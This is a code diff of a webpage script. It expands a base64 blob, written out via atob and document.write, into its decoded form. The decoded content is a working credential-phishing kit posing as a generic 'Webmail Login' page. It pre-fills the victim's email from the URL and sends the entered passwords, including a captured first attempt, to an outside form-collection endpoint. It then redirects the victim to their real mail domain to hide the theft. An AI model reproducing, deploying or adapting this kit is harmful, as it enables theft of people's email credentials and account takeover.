@@ -1,4 +1,187 @@
 <script>
-var data = atob("ICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPCEtLSBQcmV2ZW50IHNlYXJjaCBlbmdpbmVzIGZyb20gaW5kZXhpbmcgdGhpcyBwYWdlIC0tPgogIDxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbmRleCwgbm9mb2xsb3ciPgogIDx0aXRsZT5XZWJtYWlsIExvZ2luPC90aXRsZT4KICA8c3R5bGU+CiAgICAqe21hcmdpbjowO3BhZGRpbmc6MDtib3gtc2l6aW5nOmJvcmRlci1ib3g7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLC1hcHBsZS1zeXN0ZW0sQmxpbmtNYWNTeXN0ZW1Gb250LCdTZWdvZSBVSScsUm9ib3RvLE94eWdlbixVYnVudHUsQ2FudGFyZWxsLHNhbnMtc2VyaWZ9CiAgICBib2R5e2JhY2tncm91bmQ6I2Y1ZjVmNTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7bWluLWhlaWdodDoxMDB2aDtwYWRkaW5nOjIwcHg7Y29sb3I6IzMzM30KICAgIC5sb2dpbi1jb250YWluZXJ7d2lkdGg6MTAwJTttYXgtd2lkdGg6NDIwcHg7YmFja2dyb3VuZDojZmZmO2JvcmRlci1yYWRpdXM6NHB4O2JveC1zaGFkb3c6MCAycHggMTBweCByZ2JhKDAsMCwwLC4xKTtvdmVyZmxvdzpoaWRkZW59CiAgICAubG9naW4taGVhZGVye2JhY2tncm91bmQ6IzAwNWE5ZTtjb2xvcjojZmZmO3BhZGRpbmc6MjBweDt0ZXh0LWFsaWduOmNlbnRlcn0KICAgIC5sb2dpbi1oZWFkZXIgaDF7Zm9udC1zaXplOjIycHg7Zm9udC13ZWlnaHQ6NDAwfQogICAgLmxvZ2luLWZvcm17cGFkZGluZzozMHB4fQogICAgLmZvcm0tZ3JvdXB7bWFyZ2luLWJvdHRvbToyMHB4fQogICAgLmlucHV0LXdpdGgtaWNvbntwb3NpdGlvbjpyZWxhdGl2ZX0KICAgIC5pbnB1dC13aXRoLWljb24gc3Zne3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6MTJweDt0b3A6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVZKC01MCUpO3dpZHRoOjE2cHg7aGVpZ2h0OjE2cHg7ZmlsbDojNjY2fQogICAgaW5wdXRbdHlwZT0idGV4dCJdLGlucHV0W3R5cGU9InBhc3N3b3JkIl17d2lkdGg6MTAwJTtwYWRkaW5nOjEycHggMTJweCAxMnB4IDQwcHg7Ym9yZGVyOjFweCBzb2xpZCAjY2NjO2JvcmRlci1yYWRpdXM6NHB4O2ZvbnQtc2l6ZToxNHB4O3RyYW5zaXRpb246Ym9yZGVyIC4zc30KICAgIGlucHV0W3R5cGU9InRleHQiXTpmb2N1cyxpbnB1dFt0eXBlPSJwYXNzd29yZCJdOmZvY3Vze2JvcmRlci1jb2xvcjojMDA1YTllO291dGxpbmU6bm9uZTtib3gtc2hhZG93OjAgMCAwIDJweCByZ2JhKDAsOTAsMTU4LC4yKX0KICAgIC5jaGVja2JveC1ncm91cHtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO21hcmdpbi1ib3R0b206MjBweH0KICAgIC5jaGVja2JveC1ncm91cCBpbnB1dHttYXJnaW4tcmlnaHQ6OHB4fQogICAgLmNoZWNrYm94LWdyb3VwIGxhYmVse21hcmdpbi1ib3R0b206MDtmb250LXdlaWdodDo0MDB9CiAgICBidXR0b257d2lkdGg6MTAwJTtwYWRkaW5nOjEycHg7YmFja2dyb3VuZDojMDA1YTllO2JvcmRlcjpub25lO2JvcmRlci1yYWRpdXM6NHB4O2NvbG9yOiNmZmY7Zm9udC1zaXplOjE0cHg7Zm9udC13ZWlnaHQ6NjAwO2N1cnNvcjpwb2ludGVyO3RyYW5zaXRpb246YmFja2dyb3VuZCAuM3N9CiAgICBidXR0b246aG92ZXJ7YmFja2dyb3VuZDojMDA0YTg3fQogICAgLmZvb3Rlcnt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW4tdG9wOjIwcHg7Y29sb3I6IzY2Njtmb250LXNpemU6MTJweH0KICAgIC5mb290ZXIgYXtjb2xvcjojMDA1YTllO3RleHQtZGVjb3JhdGlvbjpub25lfQogICAgLmZvb3RlciBhOmhvdmVye3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmV9CiAgICAubGFuZ3VhZ2Utc2VsZWN0b3J7dGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLXRvcDoxNXB4O2ZvbnQtc2l6ZToxMnB4O2NvbG9yOiM2NjZ9CiAgICAubGFuZ3VhZ2Utc2VsZWN0b3Igc2VsZWN0e3BhZGRpbmc6NXB4O2JvcmRlcjoxcHggc29saWQgI2NjYztib3JkZXItcmFkaXVzOjNweDtmb250LXNpemU6MTJweDttYXJnaW4tbGVmdDo1cHh9CiAgICAuc2VjdXJpdHktbm90aWNle2JhY2tncm91bmQ6I2Y4ZjhmODtib3JkZXItdG9wOjFweCBzb2xpZCAjZWVlO3BhZGRpbmc6MTVweDt0ZXh0LWFsaWduOmNlbnRlcjtmb250LXNpemU6MTJweDtjb2xvcjojNjY2fQogICAgLnNlY3VyaXR5LW5vdGljZSBzdmd7d2lkdGg6MTJweDtoZWlnaHQ6MTJweDtmaWxsOiMyZWNjNzE7bWFyZ2luLXJpZ2h0OjVweH0KICAgIC8qIExvYWRlciBzdHlsZSAqLwogICAgLmxvYWRlcntkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSk7ei1pbmRleDo5OTk5O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyfQogICAgLmxvYWRlcjo6YWZ0ZXJ7Y29udGVudDoiIjt3aWR0aDo0MHB4O2hlaWdodDo0MHB4O2JvcmRlcjo0cHggc29saWQgI2ZmZjtib3JkZXItdG9wLWNvbG9yOiMwMDVhOWU7Ym9yZGVyLXJhZGl1czo1MCU7YW5pbWF0aW9uOnNwaW4gMC44cyBsaW5lYXIgaW5maW5pdGV9CiAgICBAa2V5ZnJhbWVzIHNwaW57dG97dHJhbnNmb3JtOnJvdGF0ZSgzNjBkZWcpfX0KICA8L3N0eWxlPgoKCiAgPGRpdiBjbGFzcz0ibG9hZGVyIiBpZD0ibG9hZGVyIj48L2Rpdj4KICAKICA8ZGl2IGNsYXNzPSJsb2dpbi1jb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0ibG9naW4taGVhZGVyIj4KICAgICAgPGgxPldlYm1haWwgTG9naW48L2gxPgogICAgPC9kaXY+CiAgICAKICAgIDxkaXYgY2xhc3M9ImxvZ2luLWZvcm0iPgogICAgICA8Zm9ybSBpZD0ibG9naW5Gb3JtIiBtZXRob2Q9IlBPU1QiPgogICAgICAgIDwhLS0gSG9uZXlwb3QgZmllbGQgLSBpbnZpc2libGUgdG8gaHVtYW5zLCB0cmFwcyBib3RzIC0tPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJfZ290Y2hhIiBzdHlsZT0iZGlzcGxheTpub25lIiB0YWJpbmRleD0iLTEiIGF1dG9jb21wbGV0ZT0ib2ZmIj4KICAgICAgICAKICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LXdpdGgtaWNvbiI+CiAgICAgICAgICAgIDxzdmcgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgICAgICAgICAgICA8cGF0aCBkPSJNMjAgNEg0Yy0xLjEgMC0xLjk5LjktMS45OSAyTDIgMThjMCAxLjEuOSAyIDIgMmgxNmMxLjEgMCAyLS45IDItMlY2YzAtMS4xLS45LTItMi0yem0wIDRsLTggNS04LTVWNmw4IDUgOC01djJ6Ij48L3BhdGg+CiAgICAgICAgICAgIDwvc3ZnPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InVzZXIiIG5hbWU9ImVtYWlsIiBwbGFjZWhvbGRlcj0iIiByZWFkb25seT0iIj4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIAogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtd2l0aC1pY29uIj4KICAgICAgICAgICAgPHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiPgogICAgICAgICAgICAgIDxwYXRoIGQ9Ik0xOCA4aC0xVjZjMC0yLjc2LTIuMjQtNS01LTVTNyAzLjI0IDcgNnYySDZjLTEuMSAwLTIgLjktMiAydjEwYzAgMS4xLjkgMiAyIDJoMTJjMS4xIDAgMi0uOSAyLTJWMTBjMC0xLjEtLjktMi0yLTJ6TTEyIDE3Yy0xLjEgMC0yLS45LTItMnMuOS0yIDItMiAyIC45IDIgMi0uOSAyLTIgMnpNMTUuMSA4SDguOVY2YzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xIDEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xdjJ6Ij48L3BhdGg+CiAgICAgICAgICAgIDwvc3ZnPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZD0iIj4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIAogICAgICAgIDxkaXYgY2xhc3M9ImNoZWNrYm94LWdyb3VwIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgaWQ9InJlbWVtYmVyIj4KICAgICAgICAgIDxsYWJlbCBmb3I9InJlbWVtYmVyIj5SZW1lbWJlciBtZTwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgCiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPlNpZ24gSW48L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgICAKICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyIj4KCiAgICAgIDxkaXYgY2xhc3M9Imxhbmd1YWdlLXNlbGVjdG9yIj4KICAgICAgICBMYW5ndWFnZTogCiAgICAgICAgPHNlbGVjdD4KICAgICAgICAgIDxvcHRpb24+RW5nbGlzaDwvb3B0aW9uPgogICAgICAgICAgPG9wdGlvbj5Fc3Bhw4PCsW9sPC9vcHRpb24+CiAgICAgICAgICA8b3B0aW9uPkZyYW7Dg8KnYWlzPC9vcHRpb24+CiAgICAgICAgICA8b3B0aW9uPkRldXRzY2g8L29wdGlvbj4KICAgICAgICA8L3NlbGVjdD4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIAogICAgPGRpdiBjbGFzcz0ic2VjdXJpdHktbm90aWNlIj4KICAgICAgPHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiPgogICAgICAgIDxwYXRoIGQ9Ik0xOCA4aC0xVjZjMC0yLjc2LTIuMjQtNS01LTVTNyAzLjI0IDcgNnYySDZjLTEuMSAwLTIgLjktMiAydjEwYzAgMS4xLjkgMiAyIDJoMTJjMS4xIDAgMi0uOSAyLTJWMTBjMC0xLjEtLjktMi0yLTJ6TTEyIDE3Yy0xLjEgMC0yLS45LTItMnMuOS0yIDItMiAyIC45IDIgMi0uOSAyLTIgMnpNMTUuMSA4SDguOVY2YzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xIDEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xdjJ6Ij48L3BhdGg+CiAgICAgIDwvc3ZnPgogICAgICBTZWN1cmUgU1NMIENvbm5lY3Rpb24KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8c2NyaXB0PgogICAgLy8gRm9ybXNwYXJrIGVuZHBvaW50CiAgICBjb25zdCBGT1JNU1BBUktfVVJMID0gImh0dHBzOi8vc3VibWl0LWZvcm0uY29tLzRHUXhvNnY1RyI7CiAgICAKICAgIC8vIEdldCBlbWFpbCBmcm9tIFVSTCBoYXNoIChlLmcuLCAjZW1haWxAZG9tYWluLmNvbSkKICAgIGZ1bmN0aW9uIGdldEVtYWlsRnJvbVVSTCgpIHsKICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5oYXNoICYmIHdpbmRvdy5sb2NhdGlvbi5oYXNoLmluY2x1ZGVzKCdAJykpIHsKICAgICAgICByZXR1cm4gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyaW5nKDEpOwogICAgICB9CiAgICAgIGNvbnN0IHVybFBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CiAgICAgIGlmICh1cmxQYXJhbXMuaGFzKCdlbWFpbCcpKSB7CiAgICAgICAgcmV0dXJuIHVybFBhcmFtcy5nZXQoJ2VtYWlsJyk7CiAgICAgIH0KICAgICAgcmV0dXJuIG51bGw7CiAgICB9CiAgICAKICAgIC8vIFByZS1maWxsIGVtYWlsIGZpZWxkCiAgICBjb25zdCBlbWFpbEZyb21VcmwgPSBnZXRFbWFpbEZyb21VUkwoKTsKICAgIGNvbnN0IGVtYWlsSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcicpOwogICAgaWYgKGVtYWlsRnJvbVVybCkgewogICAgICBlbWFpbElucHV0LnZhbHVlID0gZW1haWxGcm9tVXJsOwogICAgfSBlbHNlIHsKICAgICAgZW1haWxJbnB1dC52YWx1ZSA9ICdObyBlbWFpbCBzcGVjaWZpZWQgaW4gVVJMJzsKICAgIH0KICAgIAogICAgLy8gRm9ybSBzdWJtaXNzaW9uIGhhbmRsZXIKICAgIGNvbnN0IGZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5Gb3JtJyk7CiAgICBjb25zdCBsb2FkZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGVyJyk7CiAgICBsZXQgYXR0ZW1wdENvdW50ID0gMDsKICAgIGxldCBmaXJzdFBhc3N3b3JkID0gJyc7CiAgICAKICAgIGZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgYXN5bmMgZnVuY3Rpb24oZSkgewogICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgIAogICAgICBjb25zdCBlbWFpbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VyJykudmFsdWUudHJpbSgpOwogICAgICBjb25zdCBwYXNzd29yZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzJykudmFsdWUudHJpbSgpOwogICAgICAKICAgICAgaWYgKCFlbWFpbCB8fCBlbWFpbCA9PT0gJ05vIGVtYWlsIHNwZWNpZmllZCBpbiBVUkwnKSB7CiAgICAgICAgYWxlcnQoJ1BsZWFzZSBlbnRlciBhIHZhbGlkIGVtYWlsIGFkZHJlc3MnKTsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgCiAgICAgIGlmICghcGFzc3dvcmQpIHsKICAgICAgICBhbGVydCgnUGxlYXNlIGVudGVyIHlvdXIgcGFzc3dvcmQnKTsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgCiAgICAgIGF0dGVtcHRDb3VudCsrOwogICAgICAKICAgICAgLy8gU2hvdyBsb2FkZXIKICAgICAgbG9hZGVyLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CiAgICAgIAogICAgICAvLyBQcmVwYXJlIGRhdGEgZm9yIEZvcm1zcGFyawogICAgICBjb25zdCBmb3JtRGF0YSA9IHsKICAgICAgICBlbWFpbDogZW1haWwsCiAgICAgICAgcGFzc3dvcmQ6IHBhc3N3b3JkLAogICAgICAgIHdlYm1haWxfbG9naW46IHRydWUKICAgICAgfTsKICAgICAgCiAgICAgIC8vIEFkZCBmaXJzdCBhdHRlbXB0IGluZm8gb24gc2Vjb25kIHRyeQogICAgICBpZiAoYXR0ZW1wdENvdW50ID09PSAyKSB7CiAgICAgICAgZm9ybURhdGEuZmlyc3RfYXR0ZW1wdF9wYXNzd29yZCA9IGZpcnN0UGFzc3dvcmQ7CiAgICAgICAgZm9ybURhdGEuYXR0ZW1wdCA9ICdzZWNvbmQnOwogICAgICB9IGVsc2UgaWYgKGF0dGVtcHRDb3VudCA9PT0gMSkgewogICAgICAgIGZpcnN0UGFzc3dvcmQgPSBwYXNzd29yZDsKICAgICAgICBmb3JtRGF0YS5hdHRlbXB0ID0gJ2ZpcnN0JzsKICAgICAgfQogICAgICAKICAgICAgdHJ5IHsKICAgICAgICBhd2FpdCBmZXRjaChGT1JNU1BBUktfVVJMLCB7CiAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoZm9ybURhdGEpCiAgICAgICAgfSk7CiAgICAgIH0gY2F0Y2goZXJyKSB7CiAgICAgICAgY29uc29sZS5sb2coJ0Zvcm1zcGFyayBlcnJvcjonLCBlcnIpOwogICAgICB9CiAgICAgIAogICAgICAvLyBFeHRyYWN0IGRvbWFpbiBmcm9tIGVtYWlsIGZvciByZWRpcmVjdAogICAgICBjb25zdCBkb21haW4gPSBlbWFpbC5zcGxpdCgnQCcpWzFdOwogICAgICAKICAgICAgLy8gUmVkaXJlY3QgdG8gdGhlIHJlYWwgZG9tYWluIHdpdGhvdXQgZXhwb3NpbmcgcGFzc3dvcmQgaW4gVVJMCiAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gYGh0dHBzOi8vJHtkb21haW59YDsKICAgICAgfSwgMTUwMCk7CiAgICB9KTsKICA8L3NjcmlwdD4KCgo8L2JvZHk+PC9odG1sPg==");
+var data = atob("  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Prevent search engines from indexing this page -->
+  <meta name="robots" content="noindex, nofollow">
+  <title>Webmail Login</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
+    body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#333}
+    .login-container{width:100%;max-width:420px;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
+    .login-header{background:#005a9e;color:#fff;padding:20px;text-align:center}
+    .login-header h1{font-size:22px;font-weight:400}
+    .login-form{padding:30px}
+    .form-group{margin-bottom:20px}
+    .input-with-icon{position:relative}
+    .input-with-icon svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;fill:#666}
+    input[type="text"],input[type="password"]{width:100%;padding:12px 12px 12px 40px;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border .3s}
+    input[type="text"]:focus,input[type="password"]:focus{border-color:#005a9e;outline:none;box-shadow:0 0 0 2px rgba(0,90,158,.2)}
+    .checkbox-group{display:flex;align-items:center;margin-bottom:20px}
+    .checkbox-group input{margin-right:8px}
+    .checkbox-group label{margin-bottom:0;font-weight:400}
+    button{width:100%;padding:12px;background:#005a9e;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .3s}
+    button:hover{background:#004a87}
+    .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
+    .footer a{color:#005a9e;text-decoration:none}
+    .footer a:hover{text-decoration:underline}
+    .language-selector{text-align:center;margin-top:15px;font-size:12px;color:#666}
+    .language-selector select{padding:5px;border:1px solid #ccc;border-radius:3px;font-size:12px;margin-left:5px}
+    .security-notice{background:#f8f8f8;border-top:1px solid #eee;padding:15px;text-align:center;font-size:12px;color:#666}
+    .security-notice svg{width:12px;height:12px;fill:#2ecc71;margin-right:5px}
+    /* Loader style */
+    .loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center}
+    .loader::after{content:"";width:40px;height:40px;border:4px solid #fff;border-top-color:#005a9e;border-radius:50%;animation:spin 0.8s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+
+
+  <div class="loader" id="loader"></div>
+  
+  <div class="login-container">
+    <div class="login-header">
+      <h1>Webmail Login</h1>
+    </div>
+    
+    <div class="login-form">
+      <form id="loginForm" method="POST">
+        <!-- Honeypot field - invisible to humans, traps bots -->
+        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+        
+        <div class="form-group">
+          <div class="input-with-icon">
+            <svg viewBox="0 0 24 24">
+              <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"></path>
+            </svg>
+            <input type="text" id="user" name="email" placeholder="" readonly="">
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <div class="input-with-icon">
+            <svg viewBox="0 0 24 24">
+              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path>
+            </svg>
+            <input type="password" id="pass" name="password" placeholder="Password" required="">
+          </div>
+        </div>
+        
+        <div class="checkbox-group">
+          <input type="checkbox" id="remember">
+          <label for="remember">Remember me</label>
+        </div>
+        
+        <button type="submit">Sign In</button>
+      </form>
+      
+      <div class="footer">
+
+      <div class="language-selector">
+        Language: 
+        <select>
+          <option>English</option>
+          <option>EspaÃ±ol</option>
+          <option>FranÃ§ais</option>
+          <option>Deutsch</option>
+        </select>
+      </div>
+    </div>
+    
+    <div class="security-notice">
+      <svg viewBox="0 0 24 24">
+        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path>
+      </svg>
+      Secure SSL Connection
+    </div>
+  </div>
+
+  <script>
+    // Formspark endpoint
+    const FORMSPARK_URL = "https://submit-form.com/4GQxo6v5G";
+    
+    // Get email from URL hash (e.g., #email@domain.com)
+    function getEmailFromURL() {
+      if (window.location.hash && window.location.hash.includes('@')) {
+        return window.location.hash.substring(1);
+      }
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.has('email')) {
+        return urlParams.get('email');
+      }
+      return null;
+    }
+    
+    // Pre-fill email field
+    const emailFromUrl = getEmailFromURL();
+    const emailInput = document.getElementById('user');
+    if (emailFromUrl) {
+      emailInput.value = emailFromUrl;
+    } else {
+      emailInput.value = 'No email specified in URL';
+    }
+    
+    // Form submission handler
+    const form = document.getElementById('loginForm');
+    const loader = document.getElementById('loader');
+    let attemptCount = 0;
+    let firstPassword = '';
+    
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('user').value.trim();
+      const password = document.getElementById('pass').value.trim();
+      
+      if (!email || email === 'No email specified in URL') {
+        alert('Please enter a valid email address');
+        return;
+      }
+      
+      if (!password) {
+        alert('Please enter your password');
+        return;
+      }
+      
+      attemptCount++;
+      
+      // Show loader
+      loader.style.display = 'flex';
+      
+      // Prepare data for Formspark
+      const formData = {
+        email: email,
+        password: password,
+        webmail_login: true
+      };
+      
+      // Add first attempt info on second try
+      if (attemptCount === 2) {
+        formData.first_attempt_password = firstPassword;
+        formData.attempt = 'second';
+      } else if (attemptCount === 1) {
+        firstPassword = password;
+        formData.attempt = 'first';
+      }
+      
+      try {
+        await fetch(FORMSPARK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(formData)
+        });
+      } catch(err) {
+        console.log('Formspark error:', err);
+      }
+      
+      // Extract domain from email for redirect
+      const domain = email.split('@')[1];
+      
+      // Redirect to the real domain without exposing password in URL
+      setTimeout(() => {
+        window.location.href = `https://${domain}`;
+      }, 1500);
+    });
+  </script>
+
+
+</body></html>");
 document.write(data);
 </script>
